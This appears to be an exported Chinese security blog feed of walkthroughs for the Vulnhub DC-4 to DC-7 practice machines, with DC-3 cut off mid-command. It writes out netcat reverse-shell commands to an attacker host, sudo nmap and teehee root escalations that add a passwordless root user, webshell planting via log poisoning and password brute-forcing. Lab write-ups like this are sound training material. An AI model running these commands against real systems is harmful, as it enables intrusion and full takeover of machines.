<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub系列之DC7靶场详解</title>
      <link href="/2021/05/30/dc7/"/>
      <url>/2021/05/30/dc7/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC7靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>由目标靶机的MAC地址得到目标IP为192.168.137.103，直接nmap扫描。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165509946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以知道目标开放了80和22端口，直接进入网站。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165523466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>进入网站发现CMS是drupal 8，在漏洞进行搜索，无果。所以只能查看网站。翻译一下首页的内容。     </p><blockquote><p>欢迎来到DC-7<br>DC-7引入了一些“新”概念，但我将让您弄清楚它们是什么。 :-)<br>尽管此挑战并不是技术性的全部，但如果您需要诉诸于暴力破解或字典攻击，您可能不会成功。<br>您将要做的就是在盒子外面思考。<br>方式在盒子外面。 :-)    </p></blockquote><p>通过翻译内容得知，线索在外部，观察过后发现首页下面有<code>@DC7USER</code>的标志有点可疑，所以直接用搜索引擎搜索。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165536167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以github上有资源，所以进入查看。   </p><p><img src="https://img-blog.csdnimg.cn/20210530165547901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>在仓库下发现账号密码，登陆发现失败，于是尝试ssh连接，连接成功。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165558351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>在/home/dc7user下发现两个文件。   </p><p><img src="https://img-blog.csdnimg.cn/20210530165613154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>在mbox下发现了线索，由内容可以知道这是root用户发给dc7user用户的一封邮箱，并且会以root权限定时执行<code>/opt/scripts/backups.sh</code>脚本。   </p><p><img src="https://img-blog.csdnimg.cn/20210530165624278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>由内容得知，只是执行一些命令，drush命令是drupal系统中特定的管理工具。由于脚本执行是root权限，所以只要把反弹shell命令写入该脚本即可得到root权限。可以知道www-data用户即网站用户对该脚本具有写入权限。所以现在需要拿到网站的反弹shell。   </p><p>查阅drush相关命令得知<code>drush user-password 用户名 --password="密码"</code>可以修改密码。drupal网站的有默认用户为admin，所以可以更改admin的密码。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165634891.png#pic_center" alt="在这里插入图片描述"></p><h1 id="安装插件拿shell"><a href="#安装插件拿shell" class="headerlink" title="安装插件拿shell"></a>安装插件拿shell</h1><p>由/opt/scripts/backups脚本知，需要进入/var/www/html文件下执行drush命令。修改密码成功。admin/123.com登陆网站成功。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165658361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>发现可以写入一个网页，但是网页类型没有PHP模式，所以需要下载一个PHP代码的插件即可。<br>php插件下载<a href="http://drupal.org/project/php">http://drupal.org/project/php</a>.    </p><p><img src="https://img-blog.csdnimg.cn/20210530165718854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="g"></p><p>将下载好的压缩包文件进行安装即可    </p><p><img src="https://img-blog.csdnimg.cn/20210530165735597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再把安装好的插件进行选择即可。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165746905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>将小马写入首页即可。蚁剑连接。连接成功。反弹shell到kali。     </p><p><img src="https://img-blog.csdnimg.cn/20210530165756936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>反弹成功。    </p><p><img src="https://img-blog.csdnimg.cn/20210530165805857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>反弹shell写入成功。等定时任务执行即可自动连接。    </p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>连接成功。得到flag。    </p><p><img src="https://img-blog.csdnimg.cn/202105301658143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC6靶场详解</title>
      <link href="/2021/05/27/dc6/"/>
      <url>/2021/05/27/dc6/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC6靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="爆破拿后台密码"><a href="#爆破拿后台密码" class="headerlink" title="爆破拿后台密码"></a>爆破拿后台密码</h1><p>根据目标靶机MAC地址得到目标IP：192.168.43.60，直接上nmap扫描。   </p><p><img src="https://img-blog.csdnimg.cn/20210527222623386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>开启了22和80两个端口号，并且需要指定域名解析才可以访问网页，直接在<code>/etc/hosts</code>下写入<code>192.168.43.60 wordy</code>即可。</p><p><img src="https://img-blog.csdnimg.cn/20210527222643270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>进入网站可以知道CMS为wordpress 5.1.1,直接wpscan扫描。   </p><p><img src="https://img-blog.csdnimg.cn/20210527222652462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>扫描出5个用户，把五个用户写入user.txt中，用wpscan进行密码爆破，密码用kali自带的（路径为/usr/share/wordlists/rockyou.txt)(官网给出了提示可以少花点时间爆破：<code>cat /usr/share/wordlists/rockyou.txt |grep k01&gt;password.txt</code>)    </p><p><img src="https://img-blog.csdnimg.cn/20210527222704645.png#pic_center" alt="在这里插入图片描述"></p><p>爆破出一组密码mark/helpdesk01。    </p><p>wordpress默认后台登陆路径为wp-admin。直接登陆。    </p><h1 id="命令执行拿shell"><a href="#命令执行拿shell" class="headerlink" title="命令执行拿shell"></a>命令执行拿shell</h1><p><img src="https://img-blog.csdnimg.cn/20210527222713732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在后台找突破点，最终在activity monitor插件中找到lookup可以进行域名解析，尝试进行拼接命令执行。   </p><p><img src="https://img-blog.csdnimg.cn/20210527222723128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>   发现可以进行命令执行，但是长度有限制，所以直接抓包反弹shell。   </p><p><img src="https://img-blog.csdnimg.cn/20210527222733870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>    反弹成功。   </p><h1 id="sudo切换用户"><a href="#sudo切换用户" class="headerlink" title="sudo切换用户"></a>sudo切换用户</h1><p><img src="https://img-blog.csdnimg.cn/2021052722274631.png#pic_center" alt="在这里插入图片描述"><br>   在/home/mark/stuff中发现graham密码，直接ssh连接。   </p><p> <img src="https://img-blog.csdnimg.cn/20210527222755344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>  发现/home/jens/backups.sh不需要密码即可执行。于是写入反弹shell命令<code>nc -e /bin/bash 192.168.43.173 6666</code>，执行backups.sh即可得到jens的shell。   </p><h1 id="nmap脚本提权拿root权限"><a href="#nmap脚本提权拿root权限" class="headerlink" title="nmap脚本提权拿root权限"></a>nmap脚本提权拿root权限</h1><p>  <img src="https://img-blog.csdnimg.cn/20210527222806393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>  发现nmap不需要密码即可root权限执行。nmap的–script参数可以执行脚本，脚本是用lua语言写的。   进入/tmp目录执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/bash")'</span><span class="token operator">&gt;</span>getroot.sh<span class="token function">sudo</span> nmap <span class="token parameter variable">--script</span><span class="token operator">=</span>getroot.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提权成功   </p><p><img src="https://img-blog.csdnimg.cn/20210527222817853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>拿到flag。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC5靶场详解</title>
      <link href="/2021/05/10/dc5/"/>
      <url>/2021/05/10/dc5/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC5靶场</li><li>VMware虚拟机</li><li>kali  </li></ol><h1 id="文件包含突破点"><a href="#文件包含突破点" class="headerlink" title="文件包含突破点"></a>文件包含突破点</h1><p>根据目标靶机MAC地址得到靶机IP为192.168.43.160，直接上nmap扫描。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160648929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>发现开放了80、111、36936端口，暂时只知道端口80是web站点，另外两个端口未知。其他无头绪，直接访问网页。   </p><p><img src="https://img-blog.csdnimg.cn/2021051316071075.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>进入网页，一堆的英文，看了一下内容发现没有什么用，只有Contact页面有几个输入点，经过SQL注入和XSS测试，没有发现相关漏洞。<br>卡了半天没有找到什么突破点了，所以尝试爆破目标网站的目录看是否有没发现的页面。用kaili自带目录爆破工具dirbuster。<br>命令行输入</p><pre class="line-numbers language-none"><code class="language-none">dirbuster -u http://192.168.43.160<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入命令后会自动进入软件页面。默认字典在<code>/usr/share/dirbuster/wordlists</code>目录下。     </p><p><img src="https://img-blog.csdnimg.cn/20210513160738345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>该目录下有几个字典，先选择小字典进行爆破，没有结果就进行选择其他字典爆破。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160751884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>爆破结果发现了footer.php目录。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160803711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>进入footer.php目录发现只有几个字符，但是每次刷新页面后面的年份都会变，想到了之前页面下也有类似的字符。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160814787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>经过寻找发现只有thankyou.php下面的字符年份页面刷新会变，其他页面的年份不会变，所以想到在thankyou.php页面下存在文件包含。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160825704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>经过几个常见文件包含的参数测试，发现文件包含的参数是file,并且可以访问包含页面。(可以用参数字典进行爆破寻找，毕竟真实环境中参数不会那么简单)    </p><p><img src="https://img-blog.csdnimg.cn/20210513160836426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>发现不用绕过就可以直接访问根目录下的文件，但是访问/etc/passwd文件没有收获，其他目录下也没有收获。<br>这时想到了从前面可以知道这是一个nginx站点，nginx日志默认字典路径为/var/log/nginx/access.log。所以想到了通过日志文件写入小马再通过菜刀连接。</p><p><img src="https://img-blog.csdnimg.cn/20210513160850125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>抓包写入php小马。    </p><p><img src="https://img-blog.csdnimg.cn/20210513160913339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>访问日志，发现成功写入小马。(由于之前进行目录爆破导致日志文件加载有点慢)    </p><p><img src="https://img-blog.csdnimg.cn/20210513160929972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>连接成功。<br>反弹shell到kali上。 </p><h1 id="screen提权"><a href="#screen提权" class="headerlink" title="screen提权"></a>screen提权</h1><p><img src="https://img-blog.csdnimg.cn/20210513160951506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>查看是否有提权的突破点，发现有个/bin/screen-4.5.0具有root权限。因为直接告诉我们版本了，所以直接去漏洞库查看是否有可利用的脚本。  </p><p><img src="https://img-blog.csdnimg.cn/20210513161004132.png"></p><p>发现有本地提权的利用脚本，打开41154.sh文件查看。  </p><p><img src="https://img-blog.csdnimg.cn/20210513161017147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>查看文件可以知道，脚本文件需要分成3个步骤完成。</p><p>第一步：将第一部分代码写入libhax.c文件中，再执行相应命令生成libhax.so文件。最后删除libhax.c文件。</p><p><img src="https://img-blog.csdnimg.cn/20210513161033949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>第二步：将第二部分的代码写入rootshell.c文件并执行命令生成rootshell文件，最后删除rootshell.c文件。   </p><p><img src="https://img-blog.csdnimg.cn/20210513161046238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>第三步：将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入<code>#!/bin/bash</code>表示执行环境。最后保存是需要输入<code>:set ff=unix</code>是为了防止脚本的格式错误。    </p><p><img src="https://img-blog.csdnimg.cn/20210513161059240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210513161116108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>完成3个步骤后之间把三个文件上传至靶机的/tmp文件下，然后执行./dc5即可提权。   </p><p><img src="https://img-blog.csdnimg.cn/20210513161136958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>我是用<code>scp</code>命令直接将kali中的文件夹复制到目标靶机上的。复制成功进入文件夹。记得需要给dc5.sh脚本赋予权限。  </p><p><img src="https://img-blog.csdnimg.cn/20210513161155497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>得到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC4靶场详解</title>
      <link href="/2021/05/08/dc4/"/>
      <url>/2021/05/08/dc4/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>vulhub系列之DC4靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="爆破网站管理员用户拿shell"><a href="#爆破网站管理员用户拿shell" class="headerlink" title="爆破网站管理员用户拿shell"></a>爆破网站管理员用户拿shell</h1><p><img src="https://img-blog.csdnimg.cn/20210509114225310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>由目标靶机的Mac地址可以得出靶机IP为｀192.168.43.140｀．nmap扫描结果得知目标靶机开放了80端口和22端口，所以只能从目标网站下手。直接进入网首页。    </p><p><img src="https://img-blog.csdnimg.cn/20210509114237301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>根据首页信息可以知道，有admin用户，所以直接用burpsuite爆破，用软件自带密码即可。   </p><p><img src="https://img-blog.csdnimg.cn/2021050911425012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210509114301441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>爆破成功，密码是happy。登陆进去发现是命令执行，所以直接抓包改数据，反弹shell。</p><p><img src="https://img-blog.csdnimg.cn/20210509114313327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/20210509114322384.png"></p><p>反弹shell成功，是用nc反弹成功的，bash我没有反弹成功，不知道是哪里出问题了。反弹shell命令为：</p><pre class="line-numbers language-none"><code class="language-none">nc -e /bin/bash 192.168.43.173 12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且在得到的shll用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>反弹一个完整shll。接下来就是一顿文件查看。看看有没有什么可以利用的信息。    </p><h1 id="SSH爆破密码"><a href="#SSH爆破密码" class="headerlink" title="SSH爆破密码"></a>SSH爆破密码</h1><p><img src="https://img-blog.csdnimg.cn/20210509114339435.png"></p><p>最终在/home/jim/backups目录下找到了一份密码文件，所以直接用这份密码文件ssh爆破jim。</p><p><img src="https://img-blog.csdnimg.cn/20210509114350199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>爆破成功，jim/jibril04直接ssh连接。  </p><p><img src="https://img-blog.csdnimg.cn/20210509114359683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>查看mbox,可以看出这是一个邮箱信息，所以查看邮箱内容(邮箱默认路径为/var/mail)   </p><p><img src="https://img-blog.csdnimg.cn/20210509114410641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>邮箱内容是charles发的，并且告诉了密码，所以直接su切换charles。   </p><p><img src="https://img-blog.csdnimg.cn/20210509114422851.png"></p><h1 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h1><p>进入charles，查看是否有什么提示信息。没发现可以用的信息。所以看看有不有可以提权的利用点，输入命令<code>sudo -l</code>后发现teehee不需要命令就可以执行root权限。于是查看teehee的帮助信息。   </p><p><img src="https://img-blog.csdnimg.cn/20210509114439857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>发现teehee的<code>-a</code>参数可以在文件后面加入内容，所以想到可以在/etc/passwd文件加入具有root权限的自定义用户名，并且可以不设置密码。所以根据/etc/passwd文件下的内容格式自定义用户。<br>/etc/passwd文件下的用户格式为：<br><code>用户名:密码占位符:用户id:组id:备注信息:家目录:命令执行环境</code><br>当密码占位符为空时，用户没有密码。</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">echo 'admin::0:0::/home/admin:/bin/bash' |sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210509114457921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>直接切换自定义用户，提权成功。    </p><p><img src="https://img-blog.csdnimg.cn/20210509114509700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>加入/root下拿到flag.</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub系列之DC3靶场详解</title>
      <link href="/2021/05/07/dc3/"/>
      <url>/2021/05/07/dc3/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h1><ol><li>DC-3靶场</li><li>VMware虚拟机</li><li>kali</li></ol><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a><strong>flag</strong></h1><p>只能从VM虚拟机得到目标靶场的MAC地址，从而得到目标靶场的IP地址，即192.168.43.50.直接上nmap进行扫描。</p><p><img src="https://img-blog.csdnimg.cn/20210508181418389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>由nmap结果可以知道，目标靶场只开放了80端口。所以直接访问网页。</p><p><img src="https://img-blog.csdnimg.cn/20210508181435430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p><p>根据提示只有一个flag，并且需要拿到root权限才能得到。并且可以知道网站的CMS系统是Joomla。kali自带Joomla的扫描命令即Joomscan.</p><pre class="line-numbers language-none"><code class="language-none">joomscan -u 